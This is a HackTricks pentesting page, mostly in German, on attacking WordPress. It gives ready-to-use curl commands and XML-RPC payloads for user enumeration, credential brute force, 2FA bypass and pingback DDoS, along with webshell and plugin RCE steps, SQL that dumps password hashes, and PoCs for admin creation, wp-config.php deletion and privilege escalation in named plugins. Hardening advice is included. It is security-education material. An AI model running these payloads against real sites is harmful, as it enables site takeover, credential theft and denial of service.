# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** you can find the root password of the database.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` enth√§lt n√ºtzliche Informationen wie die installierte WordPress-Version.
- `wp-activate.php` wird f√ºr den E-Mail-Aktivierungsprozess beim Einrichten einer neuen WordPress-Seite verwendet.
- Login-Pfade (k√∂nnen umbenannt sein, um sie zu verbergen):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ist eine Datei, die eine Funktion von WordPress darstellt, die es erm√∂glicht, Daten √ºber HTTP als Transportmechanismus und XML als Kodierungsmechanismus zu √ºbertragen. Diese Art der Kommunikation wurde durch die WordPress [REST API](https://developer.wordpress.org/rest-api/reference) ersetzt.
- Der `wp-content`-Ordner ist das Hauptverzeichnis, in dem Plugins und Themes gespeichert werden.
- `wp-content/uploads/` ist das Verzeichnis, in dem alle auf die Plattform hochgeladenen Dateien gespeichert werden.
- `wp-includes/` ist das Verzeichnis, in dem Core-Dateien gespeichert sind, wie Zertifikate, Fonts, JavaScript-Dateien und Widgets.
- `wp-sitemap.xml` In Wordpress-Versionen 5.5 und h√∂her generiert Wordpress eine sitemap XML-Datei mit allen √∂ffentlichen Beitr√§gen und √∂ffentlich abfragbaren Post-Typen und Taxonomien.

**Post exploitation**

- Die Datei `wp-config.php` enth√§lt Informationen, die WordPress ben√∂tigt, um eine Verbindung zur Datenbank herzustellen, wie Datenbankname, Datenbankhost, Benutzername und Passwort, Authentication Keys und Salts sowie das Datenbank-Tabellenpr√§fix. Diese Konfigurationsdatei kann auch verwendet werden, um den DEBUG-Modus zu aktivieren, was bei der Fehlerbehebung hilfreich sein kann.

### Benutzerberechtigungen

- **Administrator**
- **Editor**: Ver√∂ffentlicht und verwaltet eigene und fremde Beitr√§ge
- **Author**: Ver√∂ffentlicht und verwaltet eigene Beitr√§ge
- **Contributor**: Schreibt und verwaltet seine Beitr√§ge, kann sie aber nicht ver√∂ffentlichen
- **Subscriber**: Beitr√§ge ansehen und das eigene Profil bearbeiten

## **Passive Aufkl√§rung**

### **WordPress-Version ermitteln**

Pr√ºfe, ob du die Dateien `/license.txt` oder `/readme.html` finden kannst

Inside the **source code** of the page (example from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS-Link-Dateien

![](<../../images/image (533).png>)

- JavaScript-Dateien

![](<../../images/image (524).png>)

### Plugins herunterladen
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Themes abrufen
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Versionen im Allgemeinen extrahieren
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktive Enumeration

### Plugins and Themes

Du wirst wahrscheinlich nicht alle Plugins und Themes finden k√∂nnen. Um alle zu entdecken, musst du **actively Brute Force a list of Plugins and Themes** (hoffentlich gibt es automatisierte Tools, die diese Listen enthalten).

### Benutzer

- **ID Brute:** Du erh√§ltst g√ºltige Benutzer von einer WordPress-Seite durch Brute Forcing der Benutzer-IDs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Wenn die Antworten **200** oder **30X** sind, bedeutet das, dass die id **g√ºltig** ist. Wenn die Antwort **400** ist, dann ist die id **ung√ºltig**.

- **wp-json:** Sie k√∂nnen auch versuchen, Informationen √ºber die Benutzer zu erhalten, indem Sie abfragen:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Ein weiterer `/wp-json/` endpoint, der einige Informationen √ºber Benutzer preisgeben kann, ist:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Beachte, dass dieses endpoint nur Benutzer offenlegt, die einen Beitrag ver√∂ffentlicht haben. **Es werden nur Informationen √ºber die Benutzer bereitgestellt, die diese Funktion aktiviert haben**.

Beachte au√üerdem, dass **/wp-json/wp/v2/pages** IP-Adressen leaken k√∂nnte.

- **Login username enumeration**: Beim Einloggen √ºber **`/wp-login.php`** ist die **Meldung** **unterschiedlich**, je nachdem, ob der angegebene **Benutzername existiert oder nicht**.

### XML-RPC

Wenn `xml-rpc.php` aktiv ist, kannst du einen credentials brute-force durchf√ºhren oder es nutzen, um DoS-Angriffe gegen andere Ressourcen zu starten. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Um zu pr√ºfen, ob es aktiv ist, versuche, auf _**/xmlrpc.php**_ zuzugreifen und diese Anfrage zu senden:

**√úberpr√ºfen**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** oder **`metaWeblog.getUsersBlogs`** sind einige Methoden, die verwendet werden k√∂nnen, um brute-force credentials zu testen. Wenn du eine davon findest, kannst du etwas wie Folgendes senden:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Die Meldung _"Incorrect username or password"_ in einer 200-Code-Antwort sollte erscheinen, wenn die Anmeldedaten nicht g√ºltig sind.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Mit den korrekten Zugangsdaten kannst du eine Datei hochladen. In der Antwort wird der Pfad angezeigt ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Au√üerdem gibt es eine **schnellere Methode**, um Zugangsdaten per brute-force mit **`system.multicall`** zu testen, da du mehrere Zugangsdaten in derselben Anfrage ausprobieren kannst:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Diese Methode ist f√ºr Programme und nicht f√ºr Menschen gedacht und veraltet, daher unterst√ºtzt sie kein 2FA. Wenn du also g√ºltige creds hast, das Haupt-Login aber durch 2FA gesch√ºtzt ist, **k√∂nntest du xmlrpc.php missbrauchen, um dich mit diesen creds einzuloggen und 2FA zu umgehen**. Beachte, dass du nicht alle Aktionen ausf√ºhren kannst, die √ºber die Konsole m√∂glich sind, aber du k√∂nntest dennoch RCE erreichen, wie Ippsec in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) erkl√§rt.

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\  
This can be used to ask **Tausende** von **Wordpress**-**sites** dazu, eine einzige **Location** anzusprechen (wodurch dort ein **DDoS** verursacht wird), oder du kannst es nutzen, um **Wordpress** ein internes **Network** scannen zu lassen (du kannst jeden Port angeben).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Wenn du einen **faultCode** mit einem Wert **gr√∂√üer** als **0** (17) erh√§ltst, bedeutet das, dass der Port offen ist.

Sieh dir die Verwendung von **`system.multicall`** im vorherigen Abschnitt an, um zu lernen, wie man diese Methode missbrauchen kann, um DDoS zu verursachen.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Diese Datei befindet sich normalerweise im Root der Wordpress-Seite: **`/wp-cron.php`**\
Wenn diese Datei **aufgerufen** wird, wird eine "heavy" MySQL **query** ausgef√ºhrt, daher k√∂nnte sie von **attackers** genutzt werden, um einen **DoS** zu **verursachen**.\
Au√üerdem wird standardm√§√üig `wp-cron.php` bei jedem Seitenaufruf aufgerufen (wann immer ein Client eine Wordpress-Seite anfordert), was bei stark frequentierten Seiten Probleme (DoS) verursachen kann.

Es wird empfohlen, Wp-Cron zu deaktivieren und einen echten cronjob auf dem Host einzurichten, der die ben√∂tigten Aktionen in regelm√§√üigen Abst√§nden ausf√ºhrt (ohne Probleme zu verursachen).

### /wp-json/oembed/1.0/proxy - SSRF

Versuche, _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ aufzurufen ‚Äî die Worpress-Seite k√∂nnte dann eine Anfrage an dich senden.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Dieses Tool pr√ºft, ob der **methodName: pingback.ping** und der Pfad **/wp-json/oembed/1.0/proxy** vorhanden sind, und falls ja, versucht es, diese auszunutzen.

## Automatische Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Zugriff erhalten durch √úberschreiben eines Bits

Mehr ein Kuriosum als ein echter Angriff. In the CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) konnte man 1 Bit in jeder wordpress-Datei umdrehen. So konnte man das Bit an Position `5389` der Datei `/var/www/html/wp-includes/user.php` umdrehen, um die NOT (`!`) Operation in ein NOP zu verwandeln.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Bearbeiten einer php-Datei des verwendeten Themes (admin credentials needed)**

Appearance ‚Üí Theme Editor ‚Üí 404 Template (auf der rechten Seite)

√Ñndere den Inhalt zu einer php-Shell:

![](<../../images/image (384).png>)

Suche im Internet, wie du auf diese aktualisierte Seite zugreifen kannst. In diesem Fall musst du hier zugreifen: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Du kannst verwenden:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
um eine Session zu erhalten.

## Plugin RCE

### PHP plugin

Es kann m√∂glich sein, .php-Dateien als Plugin hochzuladen.\
Erstelle deinen php-Backdoor z.B. mit:

![](<../../images/image (183).png>)

Dann f√ºge ein neues Plugin hinzu:

![](<../../images/image (722).png>)

Plugin hochladen und auf Install Now dr√ºcken:

![](<../../images/image (249).png>)

Auf Procced klicken:

![](<../../images/image (70).png>)

Wahrscheinlich scheint das zun√§chst nichts zu bewirken, aber wenn du zu Media gehst, siehst du deine hochgeladene Shell:

![](<../../images/image (462).png>)

Rufe sie auf und du siehst die URL, um die Reverse Shell auszuf√ºhren:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Diese Methode beinhaltet die Installation eines b√∂sartigen Plugins, das daf√ºr bekannt ist, verwundbar zu sein und ausgenutzt werden kann, um eine Web-Shell zu erhalten. Dieser Prozess wird √ºber das WordPress-Dashboard wie folgt durchgef√ºhrt:

1. **Plugin Acquisition**: Das Plugin wird aus einer Quelle wie Exploit DB bezogen, z. B. [**hier**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navigiere zum WordPress-Dashboard, dann zu `Dashboard > Plugins > Upload Plugin`.
- Lade die Zip-Datei des heruntergeladenen Plugins hoch.
3. **Plugin Activation**: Nachdem das Plugin erfolgreich installiert wurde, muss es √ºber das Dashboard aktiviert werden.
4. **Exploitation**:
- Mit installiertem und aktiviertem Plugin "reflex-gallery" kann dieses ausgenutzt werden, da es als verwundbar bekannt ist.
- Das Metasploit-Framework stellt einen Exploit f√ºr diese Schwachstelle bereit. Durch Laden des entsprechenden Moduls und Ausf√ºhren bestimmter Befehle kann eine meterpreter-Session hergestellt werden, die unautorisierten Zugriff auf die Site gew√§hrt.
- Dies ist nur eine von vielen Methoden, eine WordPress-Seite auszunutzen.

Der Inhalt enth√§lt visuelle Hilfen, die die Schritte im WordPress-Dashboard zum Installieren und Aktivieren des Plugins zeigen. Es ist jedoch wichtig zu beachten, dass das Ausnutzen von Schwachstellen auf diese Weise illegal und unethisch ist, wenn keine ausdr√ºckliche Genehmigung vorliegt. Diese Informationen sollten verantwortungsvoll und nur in einem legalen Kontext verwendet werden, z. B. im Rahmen eines Penetrationstests mit ausdr√ºcklicher Erlaubnis.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ ist ein Script, das dazu entwickelt wurde, eine **Cross-Site Scripting (XSS)**-Schwachstelle zu eskalieren zu **Remote Code Execution (RCE)** oder anderen kritischen Schwachstellen in WordPress. F√ºr mehr Informationen siehe [**diesen Beitrag**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Es bietet **Support f√ºr Wordpress-Versionen 6.X.X, 5.X.X und 4.X.X und erm√∂glicht:**
- _**Privilege Escalation:**_ Erstellt einen Benutzer in WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ L√§dt dein eigenes Plugin (backdoor) in WordPress hoch.
- _**(RCE) Built-In Plugin Edit:**_ Editiert ein Built-In Plugin in WordPress.
- _**(RCE) Built-In Theme Edit:**_ Editiert ein Built-In Theme in WordPress.
- _**(Custom) Custom Exploits:**_ Eigene Exploits f√ºr Third-Party WordPress Plugins/Themes.

## Post Exploitation

Benutzernamen und Passw√∂rter extrahieren:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Admin-Passwort √§ndern:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Angriffsfl√§che

Es ist entscheidend zu wissen, wie ein Wordpress Plugin Funktionalit√§t offenlegen kann, um Schwachstellen in dessen Funktionalit√§t zu finden. Du findest, wie ein Plugin Funktionalit√§t preisgeben kann, in den folgenden Aufz√§hlungspunkten und einige Beispiele verwundbarer Plugins in [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Eine M√∂glichkeit, wie ein Plugin Funktionen gegen√ºber Benutzern offenlegen kann, sind AJAX-Handler. Diese k√∂nnen Logik-, Autorisierungs- oder Authentifizierungsfehler enthalten. Au√üerdem ist es ziemlich h√§ufig, dass diese Funktionen sowohl die Authentifizierung als auch die Autorisierung auf das Vorhandensein eines wordpress nonce st√ºtzen, das **jeder in der Wordpress-Instanz authentifizierte Benutzer haben k√∂nnte** (unabh√§ngig von seiner Rolle).

Dies sind die Funktionen, die verwendet werden k√∂nnen, um eine Funktion in einem Plugin offenzulegen:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**Die Verwendung von `nopriv` macht den Endpoint f√ºr alle Benutzer zug√§nglich (auch f√ºr nicht authentifizierte).**

> [!CAUTION]
> Au√üerdem, wenn die Funktion nur die Autorisierung des Benutzers mit der Funktion `wp_verify_nonce` √ºberpr√ºft, pr√ºft diese Funktion nur, ob der Benutzer eingeloggt ist; sie pr√ºft normalerweise nicht die Rolle des Benutzers. Daher k√∂nnten Benutzer mit geringen Rechten Zugriff auf Aktionen mit hohen Rechten haben.

- **REST API**

Es ist auch m√∂glich, Funktionen von wordpress freizulegen, indem man eine REST API mit der Funktion `register_rest_route` registriert:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Der `permission_callback` ist eine Callback-Funktion, die √ºberpr√ºft, ob ein bestimmter Benutzer berechtigt ist, die API-Methode aufzurufen.

**Wenn die eingebaute `__return_true`-Funktion verwendet wird, √ºberspringt sie einfach die Benutzerberechtigungspr√ºfung.**

- **Direkter Zugriff auf die php-Datei**

Nat√ºrlich verwendet Wordpress PHP und Dateien innerhalb von Plugins sind direkt √ºber das Web zug√§nglich. Wenn also ein Plugin eine verwundbare Funktionalit√§t bereitstellt, die allein durch den Zugriff auf die Datei ausgel√∂st wird, ist sie f√ºr jeden Benutzer ausnutzbar.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Einige Plugins implementieren ‚Äútrusted header‚Äù-Abk√ºrzungen f√ºr interne Integrationen oder Reverse-Proxy und verwenden diesen Header dann, um den aktuellen Benutzerkontext f√ºr REST-Anfragen zu setzen. Wenn der Header nicht von einer vorgelagerten Komponente kryptografisch an die Anfrage gebunden ist, kann ein Angreifer ihn f√§lschen und privilegierte REST-Routen als Administrator aufrufen.

- Impact: unauthenticated privilege escalation to admin by creating a new administrator via the core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (erzwingt Benutzer-ID 1, typischerweise das erste Administrator-Konto).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Warum es funktioniert

- Das Plugin mappt einen vom Client kontrollierten Header auf den Authentifizierungsstatus und umgeht Capability-Pr√ºfungen.
- WordPress core erwartet die `create_users` capability f√ºr diese Route; das Plugin-Hack umgeht dies, indem es den aktuellen Benutzerkontext direkt aus dem Header setzt.

Erwartete Erfolgssignale

- HTTP 201 mit einem JSON-Body, der den erstellten Benutzer beschreibt.
- Ein neuer Admin-Benutzer sichtbar in `wp-admin/users.php`.

Checkliste zur Erkennung

- Grep nach `getallheaders()`, `$_SERVER['HTTP_...']` oder vendor SDKs, die benutzerdefinierte Header lesen, um den Benutzerkontext zu setzen (z. B. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Pr√ºfe REST-Registrierungen auf privilegierte Callbacks, denen robuste `permission_callback`-Pr√ºfungen fehlen und die stattdessen auf Request-Header vertrauen.
- Suche nach Verwendungen von Core-User-Management-Funktionen (`wp_insert_user`, `wp_create_user`) innerhalb von REST-Handlern, die nur anhand von Header-Werten gesch√ºtzt sind.

Absicherung

- Leite Authentifizierung oder Autorisierung niemals aus vom Client kontrollierten Headern ab.
- Wenn ein Reverse-Proxy Identit√§t injizieren muss, beende das Vertrauen am Proxy und entferne eingehende Kopien (z. B. `unset X-Wcpay-Platform-Checkout-User` an der Peripherie), und √ºbermittle stattdessen ein signiertes Token, das serverseitig verifiziert wird.
- F√ºr REST-Routen, die privilegierte Aktionen ausf√ºhren, fordere `current_user_can()`-Pr√ºfungen und ein striktes `permission_callback` (verwende NICHT `__return_true`).
- Bevorzuge First-Party-Auth (cookies, application passwords, OAuth) gegen√ºber Header-‚Äúimpersonation‚Äù.

References: siehe die Links am Ende dieser Seite f√ºr einen √∂ffentlichen Fall und eine breitere Analyse.

### Nicht authentifizierte beliebige Dateil√∂schung via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress-Themes und -Plugins exponieren h√§ufig AJAX-Handler √ºber die Hooks `wp_ajax_` und `wp_ajax_nopriv_`. Wenn die **_nopriv_**-Variante verwendet wird, **wird der Callback f√ºr nicht authentifizierte Besucher erreichbar**, daher muss jede sensible Aktion zus√§tzlich implementieren:

1. Eine Berechtigungspr√ºfung (z. B. `current_user_can()` oder zumindest `is_user_logged_in()`), und
2. Einen CSRF-Nonce, validiert mit `check_ajax_referer()` / `wp_verify_nonce()`, und
3. Strikte Eingabe-Sanitisation / -Validierung.

Das Litho-Multipurpose-Theme (< 3.1) hat diese 3 Kontrollen in der *Remove Font Family*-Funktion vergessen und lieferte schlie√ülich den folgenden Code (vereinfacht):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Issues introduced by this snippet:

* **Nicht authentifizierter Zugriff** ‚Äì der Hook `wp_ajax_nopriv_` ist registriert.
* **Kein Nonce-/Capability-Check** ‚Äì jeder Besucher kann den Endpoint erreichen.
* **Keine Pfad-Sanitisation** ‚Äì der vom Benutzer kontrollierte String `fontfamily` wird ohne Filter an einen Dateisystempfad angeh√§ngt, was klassisches `../../`-Traversal erm√∂glicht.

#### Ausnutzung

Ein Angreifer kann jede Datei oder jedes Verzeichnis **unterhalb des uploads-Basisverzeichnisses** (normalerweise `<wp-root>/wp-content/uploads/`) l√∂schen, indem er eine einzelne HTTP POST-Anfrage sendet:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Weil `wp-config.php` au√üerhalb von *uploads* liegt, reichen vier `../`-Sequenzen in einer Standardinstallation. Das L√∂schen von `wp-config.php` versetzt WordPress beim n√§chsten Besuch in den *Installationsassistenten*, wodurch eine vollst√§ndige √úbernahme der Seite m√∂glich wird (der Angreifer liefert lediglich eine neue DB-Konfiguration und erstellt einen Admin-Benutzer).

Weitere wirkungsvolle Ziele sind Plugin-/Theme-`.php`-Dateien (um Sicherheitsplugins zu deaktivieren) oder `.htaccess`-Regeln.

#### Erkennungs-Checkliste

* Jede `add_action( 'wp_ajax_nopriv_...')`-Callback-Funktion, die Dateisystem-Helper (`copy()`, `unlink()`, `$wp_filesystem->delete()`, usw.) aufruft.
* Verkettung von unsanitisierten Benutzereingaben in Pfade (auf `$_POST`, `$_GET`, `$_REQUEST` achten).
* Fehlen von `check_ajax_referer()` und `current_user_can()`/`is_user_logged_in()`.

#### H√§rtung
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// ‚Ä¶ proceed ‚Ä¶
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  üîí  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Behandle** jede Schreib-/L√∂schoperation auf der Festplatte immer als privilegiert und √ºberpr√ºfe doppelt:
> ‚Ä¢ Authentifizierung  ‚Ä¢ Autorisierung  ‚Ä¢ Nonce  ‚Ä¢ Eingabe-Sanitisation  ‚Ä¢ Pfad-Einschlusspr√ºfung (z. B. √ºber `realpath()` plus `str_starts_with()`).

---

### Privilegieneskalation durch veraltete Rollwiederherstellung und fehlende Autorisierung (ASE "View Admin as Role")

Viele Plugins implementieren eine "view as role" oder tempor√§re Rollentausch-Funktion, indem sie die urspr√ºnglichen Rolle(n) in user meta speichern, damit sie sp√§ter wiederhergestellt werden k√∂nnen. Wenn der Wiederherstellungsweg nur auf Request-Parametern (z. B. `$_REQUEST['reset-for']`) und einer plugin-gepflegten Liste beruht, ohne capabilities und einen g√ºltigen Nonce zu pr√ºfen, wird dies zu einer vertikalen Privilegieneskalation.

Ein reales Beispiel wurde im Admin and Site Enhancements (ASE) Plugin (‚â§ 7.6.2.1) gefunden. Der Reset-Zweig stellte Rollen basierend auf `reset-for=<username>` wieder her, wenn der Benutzername in einem internen Array `$options['viewing_admin_as_role_are']` erschien, f√ºhrte jedoch weder eine `current_user_can()`-Pr√ºfung noch eine Nonce-√úberpr√ºfung durch, bevor die aktuellen Rollen entfernt und die aus user meta `_asenha_view_admin_as_original_roles` gespeicherten Rollen wieder hinzugef√ºgt wurden:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Warum es ausnutzbar ist

- Vertraut `$_REQUEST['reset-for']` und einer Plugin-Option ohne serverseitige Autorisierung.
- Wenn ein Benutzer zuvor h√∂here Privilegien in `_asenha_view_admin_as_original_roles` gespeichert hatte und herabgestuft wurde, kann er diese wiederherstellen, indem er den Reset-Pfad aufruft.
- In einigen Deployments konnte jeder authentifizierte Benutzer einen Reset f√ºr einen anderen Benutzernamen ausl√∂sen, der noch in `viewing_admin_as_role_are` vorhanden ist (fehlende Autorisierung).

Voraussetzungen f√ºr den Angriff

- Anf√§llige Plugin-Version mit aktivierter Funktion.
- Das Zielkonto hat eine veraltete hochprivilegierte Rolle in user meta gespeichert, aus fr√ºherer Nutzung.
- Beliebige authentifizierte Sitzung; fehlender nonce/capability im Reset-Flow.

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Auf verwundbaren Builds entfernt dies die aktuellen Rollen und f√ºgt die gespeicherten urspr√ºnglichen Rollen wieder hinzu (z. B. `administrator`), wodurch effektiv Privilegien eskaliert werden.

Detection checklist

- Suchen Sie nach Funktionen zum Rollenwechsel, die den Zustand "urspr√ºngliche Rollen" im user meta persistieren (z. B. `_asenha_view_admin_as_original_roles`).
- Identifizieren Sie Reset-/Restore-Pfade, die:
- Benutzernamen aus `$_REQUEST` / `$_GET` / `$_POST` lesen.
- Rollen via `add_role()` / `remove_role()` √§ndern, ohne `current_user_can()` und `wp_verify_nonce()` / `check_admin_referer()` zu verwenden.
- Autorisieren basierend auf einem Plugin-Options-Array (z. B. `viewing_admin_as_role_are`) anstelle der F√§higkeiten des Akteurs.

Hardening

- F√ºhren Sie Berechtigungspr√ºfungen in jedem zustands√§ndernden Zweig durch (z. B. `current_user_can('manage_options')` oder strenger).
- Fordern Sie Nonces f√ºr alle Rollen-/Berechtigungs√§nderungen an und verifizieren Sie diese: `check_admin_referer()` / `wp_verify_nonce()`.
- Vertrauen Sie niemals auf vom Request gelieferte Benutzernamen; ermitteln Sie den Zielbenutzer serverseitig basierend auf dem authentifizierten Akteur und einer expliziten Richtlinie.
- Ung√ºltig machen des Zustands "urspr√ºngliche Rollen" bei Profil-/Rollen-Updates, um die Wiederherstellung veralteter hoher Privilegien zu vermeiden:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
